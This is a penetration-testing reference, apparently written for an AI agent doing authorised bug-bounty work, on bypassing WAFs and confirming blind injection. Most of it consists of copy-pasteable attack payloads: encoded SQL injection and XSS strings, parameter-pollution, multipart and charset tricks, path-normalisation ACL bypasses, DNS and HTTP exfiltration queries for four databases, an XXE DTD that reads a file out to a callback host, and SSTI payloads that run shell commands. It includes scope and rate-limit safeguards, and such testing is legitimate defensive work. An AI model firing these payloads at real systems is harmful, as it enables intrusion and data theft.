# Reference — Bypass and Blind

Two jobs. Get a payload past a filter. Get a result out of a sink that shows you nothing.

`CLAUDE.md` rule 6 sends you here when a WAF answers. Rule 8 sends you here when a sink is blind. Neither
state is a negative. A row stays `suspicious` until you have either landed a payload or exhausted this file.

Technique cards for the sinks themselves live in `01-injection.md` and `02-info-disclosure.md`. This file is
only about delivery and read-back. Do not look for "what is SQLi" here.

## B.1 When to open this file

| Trigger | First section |
|---|---|
| Ledger row is `suspicious` (`00-surface-and-ledger.md` 2.5) | 3.2 |
| 403 / 406 / 429 / 501 that looks like a WAF | 3.2, then 3.5 |
| Payload works on your local copy, fails on target | 3.2, then 3.3 and B.4 |
| Payload works with one encoding, breaks with another | 3.3 |
| Two layers disagree about the request (proxy vs app) | 3.4 |
| Sink has no reflected output at all | 3.7 |
| Sink is blind and callbacks never arrive | 3.8 |
| Confirmed blind sink, need proof | 3.9 |

## B.2 Identify the blocker first

Bypassing the wrong layer wastes hours. A WAF bypass will never beat a framework type check, and an encoding
trick will never beat an app-level allowlist. Fingerprint the layer before you pick a family.

Send three probes and compare against the baseline you stored in `coverage.md`:

```
A  normal value                          -> baseline
B  obviously hostile, no evasion   '"><   -> the block
C  hostile but syntactically valid for the field type
```

| Signal | WAF / edge | Framework validation | App allowlist | Generic 403 / authz |
|---|---|---|---|---|
| Status | 403, 406, 429, 501, sometimes 200 with block page | 400, 422 | 200 or 400 | 403, 401 |
| Body | branded page, ref/support ID, no app chrome | framework-shaped error JSON, field name named | app's own error copy, in app chrome | short, no app chrome |
| Headers | `cf-ray`, `x-amzn-*`, `akamai*`, `x-iinfo`, `x-cdn`, `server` changes | unchanged from baseline | unchanged | unchanged |
| Cookies | new edge cookie (`__cf_bm`), session cookie absent | session cookie echoed normally | session echoed | may drop session |
| Timing | faster than baseline (never reached app) | same order as baseline | same or slower | fast |
| Reacts to payload in any field | yes, position-independent | only the validated field | only the validated field | no, path-based |
| Reacts to `User-Agent`/`Referer` payload | yes | no | no | no |
| Length | fixed across different payloads | varies with field | varies | fixed |

Reading it:

- **Fixed-length response, faster than baseline, edge header, hostile string in a header also triggers it** → edge WAF. Go to 3.3, 3.4, 3.5.
- **400/422 naming the field, only that field reacts, app chrome intact** → framework validation. Encoding will not help. Find the type the validator wants and inject inside it (3.4 JSON quirks, type juggling).
- **App's own error copy, only that field, rejects unknown values but accepts every valid one** → app allowlist. Only parser differentials (B.4) or a second-order path (`CLAUDE.md` rule 7) get past it.
- **403 on the path regardless of payload** → not a filter. It is authz, out of scope per `CLAUDE.md` 1. One line in `out-of-scope.md`.

Confirm which layer answered before you spend a request on evasion:

```bash
# does a payload in an unused header trip it? -> edge WAF, not field validation
curl -s -o /dev/null -w '%{http_code} %{size_download} %{time_total}\n' \
  -H 'X-Probe: 1 OR 1=1-- -' 'https://TARGET/api/search?q=hello'

# does the edge see the path at all? a bogus path with the same payload
curl -s -o /dev/null -w '%{http_code} %{size_download}\n' \
  'https://TARGET/definitely-not-a-real-path?q=1%27%20OR%201%3D1--%20-'
```

If the bogus path gives the same block page, the block is edge-side and payload-driven. That is a WAF.

## B.3 Encoding and representation

One filter, many spellings. Work up the layers. Every line below is literal and copy-pasteable; the target
string is `' OR 1=1-- -` or `<script>` unless noted.

### Layer 1 — URL and double URL

```
' OR 1=1-- -
%27%20OR%201%3D1--%20-
%2527%2520OR%25201%253D1--%2520-        double-encoded, for a proxy that decodes once
%%32%37                                 partial/nested, some parsers resolve to %27
+OR+1%3D1--+-                           plus as space
```

Double URL encoding wins when a decode happens between the filter and the sink. Test it early; it is one
request and it is the single most common working bypass.

### Layer 2 — Unicode, overlong UTF-8, homoglyphs

```
%c0%a7            overlong UTF-8 for '        (rejected by strict decoders, accepted by sloppy ones)
%c0%af            overlong /
%e0%80%a7         3-byte overlong '
%u0027            IIS/.NET-style %u escape
%uff07            fullwidth apostrophe -> normalises to ' in some pipelines
\u0027            JSON string escape (B.4)
```

Homoglyph and normalisation tricks. These only work when the app runs Unicode normalisation (NFKC) or a
case-mapping *after* the filter:

```
＜script＞        fullwidth < >    U+FF1C U+FF1E  -> NFKC -> < >
ﬁ                 U+FB01 -> NFKC -> "fi"   (breaks length checks, smuggles letters)
ı I               dotless i / Turkish I    -> case-folding differentials on SELECT/select
%ef%bc%87         UTF-8 of fullwidth '
Ⅰ ⅰ              Roman numeral chars -> NFKC -> I i
```

Test order: send NFKC-normalising candidate, look for the *normalised* form in any reflection. If the
response echoes `<script>` after you sent `＜script＞`, normalisation runs post-filter. That is a bypass.

### Layer 3 — HTML entities and numeric bases

Only useful when the sink parses HTML/XML after the filter, or when the language coerces numeric literals.

```
&apos;  &#39;  &#x27;  &#0000039;  &#x000027;      ' in HTML context
&lt;script&gt;                                     double-decode targets
&#x6a;avascript:                                    entity in a URL scheme
```

Numeric representation of the same value, per stack:

| Value | Decimal | Hex | Octal | Other |
|---|---|---|---|---|
| MySQL string `admin` | — | `0x61646d696e` | — | `char(97,100,109,105,110)`, `CONCAT(0x61,...)` |
| MSSQL string | — | `0x61646d696e` (use `CONVERT`) | — | `CHAR(97)+CHAR(100)` |
| Postgres string | — | `decode('61646d696e','hex')` | — | `chr(97)||chr(100)` |
| Oracle string | — | — | — | `CHR(97)||CHR(100)` |
| IP `127.0.0.1` (SSRF/host filters) | `2130706433` | `0x7f000001` | `0177.0.0.1` | `127.1`, `[::ffff:127.0.0.1]` |

Hex literals remove quotes entirely. When the filter blocks `'`, hex is usually the answer, not encoding.

### Layer 4 — Base64 and app-level decoders

If the app base64-decodes a parameter (JWT segment, `state`, `redirect`, `data`, a cookie blob), the filter
sees base64 and the sink sees your payload. Filter never matched anything.

```bash
printf "%s" "' OR 1=1-- -" | base64          # JyBPUiAxPTEtLSAt
printf "%s" "' OR 1=1-- -" | base64 | tr '+/' '-_' | tr -d '='   # base64url
```

Look for: `?data=`, `?q=` with `=` padding, cookies ending `==`, JWT payloads (`jwt_tool`, see
`99-tools.md`). Also gzip+base64 and URL-in-base64 double wraps.

### Layer 5 — Null byte, case, comments, whitespace

```
%00        truncates in C-backed parsers; breaks regexes that stop at NUL
'%00 OR 1=1
file.php%00.jpg                             extension allowlist (older stacks)
\u0000     JSON form (B.4)
```

Mixed case beats naive regex, and beats nothing else. One request to rule out:

```
' oR 1=1-- -      ' Or 1=1-- -      SeLeCt      uNiOn      <ScRiPt>
```

Comment insertion, per language:

| Language / DB | Inline comment | To end of line | Notes |
|---|---|---|---|
| MySQL / MariaDB | `/**/`, `/*!*/` | `-- ` (needs trailing space), `#` | `/*!50000SELECT*/` version-gated comment executes |
| PostgreSQL | `/**/` (nests) | `--` | nested `/*/**/*/` breaks non-nesting scanners |
| MSSQL | `/**/` | `--` | `;` stacked queries allowed |
| Oracle | `/**/` | `--` | no stacked queries |
| SQLite | `/**/` | `--` | |
| SQL keyword splitting | `UN/**/ION`, `SEL/**/ECT` | — | works only if the filter is a literal string match |
| HTML/JS | `<!-- -->`, `/* */`, `//` | — | `<scr<!--x-->ipt>` in sloppy sanitisers |
| Shell | — | `#` | `c""at`, `c\at`, `$@`, `$IFS` |
| Template (Jinja/Twig) | `{# #}` | — | see `01-injection.md` SSTI card |
| XML | `<!-- -->` | — | cannot appear inside a tag name |

Whitespace alternatives. Substitute wherever the filter expects a space:

```
generic:   %09 (tab)  %0a (LF)  %0b (VT)  %0c (FF)  %0d (CR)  %a0  %20  +  /**/
MySQL:     %09 %0a %0b %0c %0d %20 /**/ and ( ) instead of space: UNION(SELECT(1))
           also %a0 in some charsets; `SELECT/*!*/1`
Postgres:  %09 %0a %0c %0d %20 /**/  ; parens work
MSSQL:     %01-%20 are all whitespace to the tokeniser. Widest set of any DB.
Oracle:    %00 %09 %0a %0c %0d %20
shell:     ${IFS}  $IFS$9  {cat,/etc/passwd}  <<<  %09
```

### Layer 6 — Chained combinations

The filter is one pass. Stack transforms so no single pass matches.

```
# case + comment + whitespace + no quotes (MySQL)
1/**/uNiOn/**/all/**/sElEcT/**/0x61,0x62

# double URL + comment
%252f%252a%252a%252fUNION%252f%252a%252a%252fSELECT

# fullwidth + entity, XSS into an HTML sink
%EF%BC%9Cimg%20src%3Dx%20onerror%3D&#97;lert(1)%EF%BC%9E

# hex + no space + no comma (MySQL, comma blocked)
1 UNION SELECT * FROM (SELECT 0x61)a JOIN (SELECT 0x62)b

# JSON unicode escape + duplicate key (B.4)
{"q":"a","q":"\u0027 OR 1=1-- -"}

# null byte + case + double encoding
%2527%2500%2520oR%25201%253D1
```

Method: pick one axis at a time, find which axis the filter is blind to, then combine only the axes that
changed the response. Do not fire 50 permutations blind — that is noise, and B.6 applies.

## B.4 Parser differentials

Highest-value family and the most missed. Nobody is bypassing a filter here. Two components read the same
bytes differently, and the filter reads the version that looks safe.

Rule: find every place two parsers touch the request. Edge proxy vs app. Router vs handler. Validator vs ORM.
Body parser vs serializer. Each pair is a candidate.

### HTTP parameter pollution (HPP)

Send the same parameter twice. The WAF inspects one occurrence, the app uses the other.

```
?q=harmless&q=' OR 1=1-- -
?q=' OR 1=1-- -&q=harmless
?q=harmless&Q=' OR 1=1-- -          case variant
?q[]=harmless&q[]=' OR 1=1-- -      array form
?q=harmless;q=' OR 1=1-- -          semicolon separator (legacy parsers)
?q=harmless%26q=payload             encoded separator, decoded later
```

Precedence by stack, as a starting hypothesis only:

| Stack | Which occurrence wins |
|---|---|
| PHP (Apache/nginx+FPM) | last |
| ASP.NET / IIS | all, comma-concatenated (`harmless,payload`) |
| ASP classic | all, comma-concatenated |
| JSP / Servlet / Tomcat / Spring | first (`getParameter`), all via `getParameterValues` |
| Node.js / Express (`qs`) | **array** on repeat (`['a','b']`); app code then usually takes `[0]` or stringifies to `a,b` |
| Python / Flask (Werkzeug `MultiDict`) | **first** for `.get()`, full list via `.getlist()` |
| Python / Django (`QueryDict`) | **last** for `.get()`, full list via `.getlist()` |
| Ruby on Rails / Rack | last |
| Go `net/http` | first (`FormValue`), all via `r.Form["q"]` |
| Perl CGI | all, joined |
| Apache mod_* / nginx as a proxy | usually forwards untouched |

**Verify empirically. Do not trust this table.** Frameworks change, middleware overrides, and a body parser
can differ from the query parser in the same app. The test is one request with a distinguishable value in
each position:

```bash
curl -s 'https://TARGET/api/search?q=AAAA&q=BBBB' | grep -o 'AAAA\|BBBB\|AAAA,BBBB'
```

Then repeat for the body, for JSON vs form, and for query-vs-body of the same name (a value in the query and
a different value in the body — some frameworks merge them with their own precedence).

### JSON parser quirks

Two JSON parsers in one request path (edge inspection, schema validator, then the real deserializer) almost
never agree.

| Trick | Payload | Who diverges |
|---|---|---|
| Duplicate keys | `{"role":"user","role":"admin"}` | most take last, some take first, some error. WAF often reads first |
| Unicode escapes | `{"q":"\u0027 OR 1\u003d1-- -"}` | signature filters read raw bytes, deserializer produces `'` |
| Surrogate pairs / lone surrogate | `{"q":"\ud800"}` | strict parsers reject, lenient replace, lengths change |
| NUL in string | `{"q":"admin\u0000extra"}` | truncation differentials downstream |
| Comments | `{"q":"a"/*x*/}`, `{//x\n"q":"a"}` | JSON5 / Jackson with features on, Go and strict parsers reject |
| Trailing comma | `{"q":"a",}` | same split |
| Big numbers | `{"id":10000000000000000001}`, `{"id":1e400}`, `{"id":-0}` | float coercion, `id` becomes a different row |
| Leading `+`, hex numbers | `{"id":+1}`, `{"id":0x10}` | non-strict parsers only |
| Type confusion | `{"id":"1"}` vs `{"id":1}` vs `{"id":[1]}` vs `{"id":{"$ne":null}}` | validator expects scalar, ORM accepts object |
| Deep nesting / key order | `{"a":{"b":{"c":"payload"}}}` | edge inspects top level only |
| Charset | body declared `utf-16` but sent `utf-8`, or with a BOM | edge fails to parse and fails open |
| Whitespace before key | `{ "q" : "payload" }` with `%09`/`%0c` | naive regex signatures |

RISK: deeply nested JSON is a DoS primitive. Keep nesting under ~20 levels and payload size under a few KB.
`CLAUDE.md` 2 forbids DoS. Do not send a nesting bomb to find a parser limit.

### Multipart tricks

```
------X
Content-Disposition: form-data; name="file"; filename="a.txt"; filename="b.php"
Content-Type: text/plain

payload
------X--
```

| Trick | What to send |
|---|---|
| Duplicate `filename=` | two `filename=` params; validator reads one, writer the other |
| Quoted vs unquoted | `filename=a.php` (no quotes), `filename="a.php"` |
| Encoded name | `filename*=UTF-8''a%2ephp`, `filename="a%00.jpg"`, `filename="a.php%20"` |
| Path in name | `filename="../../a.txt"`, `filename="..\\a.txt"`, `filename="/etc/a.txt"` |
| Injection in name | `filename="' OR 1=1-- -.txt"`, `filename="{{7*7}}.txt"`, `filename="<svg onload=alert(1)>.svg"` |
| Boundary mismatch | declared boundary in `Content-Type` differs from body by case or trailing space |
| Boundary in payload | payload contains the boundary string, splits the part |
| Missing final `--` | some parsers accept, some drop the last part |
| CRLF vs LF | headers separated by bare `\n` — strict parsers reject, sloppy accept |
| Per-part `Content-Type` | `image/png` declared on a text payload, and the reverse |
| Duplicate `name=` | field-level HPP inside multipart |
| Part with no `Content-Disposition` | ignored by one parser, indexed by the other |

Filenames are a first-class injection vector into SQL, templates, shell, and log viewers. See
`00-surface-and-ledger.md` 2.3 item 8.

### Content-Type mismatch

Send the same data in the form the app does not expect. Edge rules are usually keyed to `Content-Type`.

```bash
# JSON body, declared as form
curl -s -X POST 'https://TARGET/api/search' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-raw '{"q":"'"'"' OR 1=1-- -"}'

# form body, declared as JSON
curl -s -X POST 'https://TARGET/api/search' \
  -H 'Content-Type: application/json' \
  --data-raw "q=' OR 1=1-- -"

# no Content-Type at all
curl -s -X POST 'https://TARGET/api/search' -H 'Content-Type:' --data-raw 'q=x'

# unknown Content-Type: many WAF rules only match known ones
curl -s -X POST 'https://TARGET/api/search' \
  -H 'Content-Type: application/x-my-format' --data-raw '{"q":"payload"}'

# Spring/Jackson and some .NET stacks accept JSON regardless of the declared type
curl -s -X POST 'https://TARGET/api/search' \
  -H 'Content-Type: text/plain' --data-raw '{"q":"payload"}'
```

Also try: `application/json;charset=x`, duplicate `Content-Type` headers, `Content-Type` with a payload in
it (`00-surface-and-ledger.md` 2.3 item 7 — the header value itself is an input).

### Charset smuggling

The edge decodes with one charset, the app with another. Your payload only exists in one of them.

```
Content-Type: application/json; charset=utf-7
+ADw-script+AD4-alert(1)+ADw-/script+AD4-          UTF-7 for <script>alert(1)</script>
+ACc- OR 1+AD0-1--                                  UTF-7 for ' OR 1=1--

Content-Type: text/xml; charset=ibm037                EBCDIC; byte values share nothing with ASCII
Content-Type: text/xml; charset=utf-16le              signature filters reading bytes see NULs
Content-Type: application/json; charset=cp437 / windows-1252 / iso-2022-jp
```

Java (`InputStreamReader` with a declared charset), .NET, and old XML stacks honour these. Node and Go
mostly do not. One test each, then move on. UTF-7 also works in the response direction on very old IE-era
sinks; not worth chasing now.

### XML vs JSON endpoint duality

Many REST endpoints still accept XML because the framework wired both. The JSON path is filtered, the XML
path is not — and the XML path gives you XXE for free.

```bash
# does the endpoint answer XML at all?
curl -s -X POST 'https://TARGET/api/search' -H 'Content-Type: application/xml' \
  --data-raw '<search><q>hello</q></search>' -o - -w '\n%{http_code}\n'
```

If yes: go to `01-injection.md` XXE card, and use the OOB DTD in B.7 rather than any in-band entity
expansion. Also try `Accept: application/xml` to flip the *response* format — error text differs and often
leaks more (`02-info-disclosure.md`).

### Path normalisation differences

The proxy routes on one path, the app resolves another. This is how an edge ACL gets bypassed, and how a
path-traversal filter gets beaten.

| Payload | Beats |
|---|---|
| `//admin` | prefix-match ACLs |
| `/./admin` | naive string compare |
| `/admin/.` , `/admin/` | exact-match route ACLs |
| `/..;/admin` | Tomcat/Java (`;` starts matrix params, stripped by the app not the proxy) |
| `/;/admin` , `/admin;foo=bar` | same family |
| `/%2e%2e%2fadmin` | proxies that do not decode before matching |
| `/%252e%252e%252fadmin` | double decode between layers |
| `/%2fadmin` , `/..%2fadmin` | encoded slash; nginx `merge_slashes`, Apache `AllowEncodedSlashes` |
| `/%c0%ae%c0%ae/admin` | overlong-UTF-8 dot |
| `/admin.` , `/admin%20` , `/admin%09` | trailing dot/space (IIS, .NET) |
| `/ADMIN` | case-sensitive ACL, case-insensitive filesystem/route |
| `/admin?` , `/admin#` | query/fragment truncation in a matcher |
| `/api/../admin` | resolution order |
| `/api/v1//../admin` | combined |
| `/%00/admin` , `/admin%00.js` | NUL truncation |
| `/static/../admin` | static handler pre-empts the ACL |
| `X-Original-URL: /admin`, `X-Rewrite-URL: /admin` | app-layer rewrite honoured behind the proxy |

Test each with a path you know returns different content for allowed vs blocked, so the signal is
unambiguous. Record which normalisation the app applies — it tells you the stack, feeding back into
`00-surface-and-ledger.md` 2.2.

Note: the same list applied to a *file* path parameter is LFI, not an ACL bypass. That card is in
`01-injection.md`; the encodings are here.

## B.5 WAF-specific notes

Fingerprint with `wafw00f` and with the block page itself (`99-tools.md`). Then pick the family most likely
to work. These are tendencies, not guarantees; verify per target.

| WAF | Block signature | Tends to fall to |
|---|---|---|
| Cloudflare | 403 or 503 interstitial, "Attention Required", `cf-ray` header, ray ID in body, `__cf_bm` cookie, 1020 error code | origin IP discovery; JSON unicode escapes; `Content-Type` mismatch; chunked/large bodies; case+comment chains. Managed rules are signature-heavy |
| AWS WAF | bare 403, tiny body, `x-amzn-requestid`, `x-amzn-errortype`, no branding | body size limit (default inspection 8KB — put payload after 8KB of padding); JSON body when rule set is query-only; HPP; `Content-Type` mismatch |
| Akamai | 403 "Access Denied", reference number, `x-akamai-*`, `akamaighost` in `server`, `x-reference-error` | path normalisation; HTTP method override; charset smuggling; multipart; header-based vectors |
| Imperva / Incapsula | 403 "Request unsuccessful", `x-iinfo` header, `visid_incap_*` / `incap_ses_*` cookies, support ID | double URL encoding; overlong UTF-8; comment insertion; parameter fragmentation across duplicated params |
| F5 BIG-IP ASM | "The requested URL was rejected", support ID number, `TS`-prefixed cookies, `BIGipServer*` | encoding layers; `%00`; whitespace alternatives; cookie-based vectors; JSON parser quirks |
| ModSecurity + CRS | 403 with `Mod_Security` or generic Apache/nginx error, anomaly-score behaviour (small payloads pass, big ones fail) | scoring thresholds — split the payload across several params; comment insertion; `/*!*/`; charset; paranoia-level gaps |
| Azure WAF / Front Door / App Gateway | 403 with a tracking GUID, `x-azure-ref`, "This request has been blocked" | body size limits; JSON escapes; HPP; `Content-Type` mismatch; header vectors |
| Generic cloud LB (no product) | 400/403, `server: envoy` / `awselb`, no body | usually not a WAF at all — re-read 3.2 |

### Origin IP discovery — the real bypass

Filters live at the edge. If you can reach the origin, there is no filter to bypass. This is the highest-value
move against every WAF above.

Signals to look for, from data you already have:
- historical DNS records (`gau` output, `crt.sh` certificates, old A records)
- SPF/MX/TXT records pointing at self-hosted mail on the same box
- a certificate on a bare IP matching the target's SAN list
- `X-Forwarded-For`/`X-Real-IP` echoes, or an IP leaked in an error page or header (`02-info-disclosure.md`)
- a subdomain not proxied by the CDN (dev, staging, mail, ftp, cpanel, direct, origin)
- a source map, JS bundle, or config file naming an internal host
- webhook or callback traffic the app sends you (its egress IP is often its ingress IP)

**RISK / scope:** an origin IP is a different host. It is in scope only if the program's scope covers that
IP or that hostname. Many programs list the apex domain and not the hosting IP; sending traffic to an
unlisted IP is out of scope, and internet-wide IP scanning is out of scope and noisy in every program.
Instead: confirm the IP belongs to the target from evidence you already hold, check it against
`targets/<target>/scope.md`, and if scope is unclear **stop and ask the operator** (`CLAUDE.md` 4). Do not
scan ranges to find it.

If in scope, the request is a normal one with the `Host` header set:

```bash
curl -s --resolve 'TARGET:443:ORIGIN_IP' -H 'X-Bug-Bounty: HANDLE' 'https://TARGET/api/search?q=test'
```

Also try the IP directly with the right `Host` over plain HTTP, and check whether the origin trusts
`X-Forwarded-For` (that is an authz question — one line in `out-of-scope.md` unless it feeds an in-scope sink).

## B.6 Rate limit and lockout handling

Defaults from `CLAUDE.md` 2: 5 req/s max, 1 concurrent wordlist job, drop to 1 req/s on any 429/503. Unless
`scope.md` says otherwise, those are the numbers.

Back-off discipline:

| Observation | Action |
|---|---|
| First 429 | drop to 1 req/s, note it in `notes.md` |
| `Retry-After` present | honour it exactly, do not shave it |
| Second 429 at 1 req/s | stop the job. Wait the longest `Retry-After` you saw, then resume single-stepped |
| 429 spreading to endpoints you are not testing | you are the cause. Stop entirely, tell the operator |
| 503 / 502 / connection resets | stop immediately (`CLAUDE.md` 4 — target may be falling over) |
| Response times climbing steadily | stop, report. You do not get to decide the target can take it |
| Account lockout counter visible (e.g. "2 attempts left") | stop. Do not burn the operator's test account |
| CAPTCHA appears | stop and ask (`CLAUDE.md` 4) |

Legitimate throttle-friendly moves:

- Reduce the payload set, not the delay. Pick the three highest-signal payloads per sink instead of forty.
- Use the baseline (`00-surface-and-ledger.md` 2.4) so one request per payload is enough. No blind re-sends.
- Sequence tests so each request answers a different question.
- Cache. Never re-request something already in Burp proxy history — ask Burp (`99-tools.md`).
- Vary only the one thing you are measuring, so a single request is conclusive.

Header rotation, honestly:

- Changing `User-Agent`, `Accept-Language`, or adding cache-busting params is fine when you are trying to
  work out *what* the filter keys on. That is fingerprinting.
- Rotating headers, cookies, sessions, or source IPs **to evade a rate limit or a block** is evasion of a
  control the program put there. Many programs forbid it explicitly, and it is grounds for removal even
  where it is not spelled out. Do not do it.
- Rotating source IPs (proxy pools, VPN hopping, cloud egress rotation) after an IP ban: never. An IP ban is
  the program telling you to stop.
- Keep `X-Bug-Bounty: <handle>` on scanner traffic when the program asks for it. It is the opposite of
  evasion and it is what stops you getting banned by accident.

When you are blocked and cannot proceed without evasion, that is a **stop and ask** (`CLAUDE.md` 4). Write
the block signature and what you tried into the ledger row and `notes.md`, and hand it to the operator. A
`suspicious` row with a documented WAF block is a good result. A ban is not.

## B.7 Out-of-band channels

Rule 8: blind means out-of-band, not "no result". A blind sink is `suspicious` until a callback channel has
been tried, whatever the response body says.

### Why DNS beats HTTP

| | DNS | HTTP |
|---|---|---|
| Egress filtering | almost always allowed — the host needs resolution to function | frequently blocked outbound |
| Proxy required | no, resolver handles it | often, and the payload may not know the proxy |
| Works from inside the DB engine | yes (any hostname lookup) | only where an HTTP client exists |
| Carries data | yes, in the subdomain label (63 bytes per label, 253 total) | yes, unlimited |
| Confirms in-band | no, fire and forget | yes, response comes back |
| Caching | a resolver may cache/dedupe repeats — vary the label every time | no |

Always try DNS first. Add an HTTP callback in the same payload when the syntax allows it, so one request
tests both. If DNS resolves but HTTP never arrives, you have proved code execution and mapped the egress
policy in one shot.

### Listener setup

```bash
# interactsh — session-scoped, note the domain in notes.md
interactsh-client -v
# gives e.g. cXXXXXXXXXXXX.oast.pro ; -json -o oob.log to keep a record
interactsh-client -json -o /root/pentest/targets/TARGET/evidence/oob.log
```

Burp Collaborator: use it when you want the interaction stitched to the request that caused it. Pattern —
generate a payload from the Collaborator client, paste it, poll, and when it fires save both the request and
the interaction to `evidence/`. Collaborator gives you the full DNS query and any HTTP body; interactsh is
faster to script. Use Collaborator for anything going into a report, because the correlation is the evidence.

Bring the listener up at session start (`99-tools.md` 1.1) so no blind finding is lost for want of a domain.

### Canary encoding — make the callback self-identifying

A callback with no identity is close to worthless. You will have dozens of payloads in flight and no idea
which one fired, or when. Encode the ledger row in the hostname.

Scheme:

```
<rowid>-<vector>-<payloadid>.<seq>.<collab-domain>

rowid      ledger ID from coverage.md, lowercased, no separators   r0142
vector     2-4 char vector code                                    q  (query) b (body) j (json)
                                                                   h (header) c (cookie) p (path)
                                                                   f (filename) x (xml) g (graphql)
payloadid  short payload family code                               sqlmy sqlpg sqlms sqlor xxe
                                                                   ssti cmd jndi deser xss ssrf
seq        optional counter for repeats, defeats resolver caching   01 02 03
```

Examples:

```
r0142-q-sqlmy.01.cXXXX.oast.pro
r0087-h-ssti.01.cXXXX.oast.pro
r0211-f-cmd.03.cXXXX.oast.pro
```

Rules that keep it working:
- Lowercase only, digits and `-` only. DNS is case-insensitive and many resolvers lowercase; anything else
  can be mangled.
- One label under 63 chars; whole name under 253.
- Never reuse a label. A cached answer means no query reaches your listener and you will read it as a
  negative.
- Log the mapping in the ledger `Notes` column as you send it: `canary r0142-q-sqlmy.01`. When the callback
  lands, the row is already identified.
- For exfil, put the data in a *separate leading label*: `<data>.r0142-q-sqlmy.01.<domain>`. Keeps the
  identity readable when the data is hex garbage.

### Per-sink OOB payloads

Sink cards are in `01-injection.md`. These are the delivery forms.

**SQL — MySQL / MariaDB**

```sql
-- DNS, Windows host only (UNC path lookup). Requires FILE privilege.
' UNION SELECT LOAD_FILE(CONCAT('\\\\r0142-q-sqlmy.01.cXXXX.oast.pro\\a')) -- -
' OR (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT HEX(SUBSTR(database(),1,10))),'.r0142-q-sqlmy.02.cXXXX.oast.pro\\a'))) -- -
```

Caveats: `LOAD_FILE` needs `FILE` privilege, and `secure_file_priv` usually blocks it. UNC lookups are
Windows-only. On Linux MySQL there is effectively no OOB channel — use 3.8 inference instead. Do not read
`/etc/passwd` via `LOAD_FILE` beyond one line as proof.

RISK — do not use: `INTO OUTFILE` / `INTO DUMPFILE` write files to the server. That is a write to the target
and a webshell primitive. `CLAUDE.md` 2 forbids it. Prove the read, stop there.

**SQL — MSSQL**

```sql
-- DNS lookup, low privilege needed, no write
'; EXEC master..xp_dirtree '\\r0142-q-sqlms.01.cXXXX.oast.pro\a'; -- -
'; EXEC master..xp_fileexist '\\r0142-q-sqlms.02.cXXXX.oast.pro\a'; -- -
-- with data
'; DECLARE @d varchar(128); SELECT @d=CONVERT(varchar(64),(SELECT DB_NAME()));
   EXEC('master..xp_dirtree ''\\'+@d+'.r0142-q-sqlms.03.cXXXX.oast.pro\a'''); -- -
-- OPENROWSET (needs ad hoc distributed queries enabled)
'; SELECT * FROM OPENROWSET('SQLNCLI','Server=r0142-q-sqlms.04.cXXXX.oast.pro;Trusted_Connection=yes;','SELECT 1'); -- -
```

`xp_dirtree` is read-only and the cleanest MSSQL OOB. Keep the data label short — `varchar(64)` and one
label, or the lookup fails silently.

RISK — do not use: `xp_cmdshell` to write or modify anything; `sp_configure` to enable features (that is a
configuration change to the target). If `xp_cmdshell` is already enabled, proof stops at `whoami`
(`CLAUDE.md` 2).

**SQL — Oracle**

```sql
-- HTTP (needs network ACL grant on 11g+)
' || UTL_HTTP.REQUEST('http://r0142-q-sqlor.01.cXXXX.oast.pro/'||(SELECT user FROM dual)) || '
-- DNS only, often ungated
' || (SELECT DBMS_LDAP.INIT('r0142-q-sqlor.02.cXXXX.oast.pro',80) FROM dual) || '
' || (SELECT UTL_INADDR.GET_HOST_ADDRESS('r0142-q-sqlor.03.cXXXX.oast.pro') FROM dual) || '
-- XXE-style via XML parser inside the DB
' || (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE r [<!ENTITY % p SYSTEM "http://r0142-q-sqlor.04.cXXXX.oast.pro/">%p;]>'),'/l') FROM dual) || '
```

`DBMS_LDAP.INIT` and `UTL_INADDR` are the reliable ones — DNS only, usually no ACL. `UTL_HTTP` is blocked by
network ACLs on most modern installs; try it, do not rely on it.

**SQL — PostgreSQL**

```sql
-- dblink: connection attempt resolves the hostname. Needs the dblink extension.
'; SELECT * FROM dblink('host=r0142-q-sqlpg.01.cXXXX.oast.pro user=x dbname=x','SELECT 1') RETURNS (a text); -- -
-- with data in the label
'; SELECT * FROM dblink('host='||(SELECT current_database())||'.r0142-q-sqlpg.02.cXXXX.oast.pro
   user=x dbname=x','SELECT 1') RETURNS (a text); -- -
```

The connection fails; the DNS query is the signal. Error text often leaks too — that is a disclosure lead,
see `02-info-disclosure.md`.

RISK — do not use: `COPY ... TO PROGRAM 'curl ...'` executes a shell command as the DB user, and
`COPY ... TO '/path'` writes a file. Both are writes to the target and forbidden by `CLAUDE.md` 2. If
`dblink` is unavailable and you suspect superuser, note the finding and stop — do not reach for
`COPY TO PROGRAM` to get a nicer callback. `lo_import`/`pg_read_file` read-only variants are acceptable for
one proof line only; never `lo_export`.

**XXE — external DTD**

Never use entity expansion (billion laughs). `CLAUDE.md` 2 forbids it.

```xml
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY % ext SYSTEM "http://r0142-x-xxe.01.cXXXX.oast.pro/e.dtd">
  %ext;
]>
<r>&exfil;</r>
```

`e.dtd` hosted on the Collaborator/interactsh side:

```xml
<!ENTITY % data SYSTEM "file:///etc/hostname">
<!ENTITY % wrap "<!ENTITY exfil SYSTEM 'http://r0142-x-xxe.01.cXXXX.oast.pro/d?v=%data;'>">
%wrap;
```

Notes: a plain `http://...` parameter entity with no file read is the safest first probe — it proves the
parser fetches external entities with zero data touched. Only then attempt one small, non-sensitive file
(`/etc/hostname`, `c:\windows\win.ini`). Multi-line files break URL-based exfil; use the FTP or
`php://filter` base64 variants in `01-injection.md`. Do not read key material, `/etc/shadow`, or app config
with credentials — if you land on credentials, stop and report (`CLAUDE.md` 4).

**SSTI — outbound fetch**

```
Jinja2/Flask   {{ ''.__class__.__mro__[1].__subclasses__() }}                 (confirm first, no egress)
Jinja2 OOB     {{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('nslookup r0087-b-ssti.01.cXXXX.oast.pro').read() }}
Twig           {{ ['nslookup r0087-b-ssti.02.cXXXX.oast.pro']|map('system')|join }}
Freemarker     ${"freemarker.template.utility.Execute"?new()("nslookup r0087-b-ssti.03.cXXXX.oast.pro")}
Velocity       #set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("nslookup r0087-b-ssti.04.cXXXX.oast.pro")
ERB/Ruby       <%= %x(nslookup r0087-b-ssti.05.cXXXX.oast.pro) %>
Smarty         {php}system("nslookup r0087-b-ssti.06.cXXXX.oast.pro");{/php}
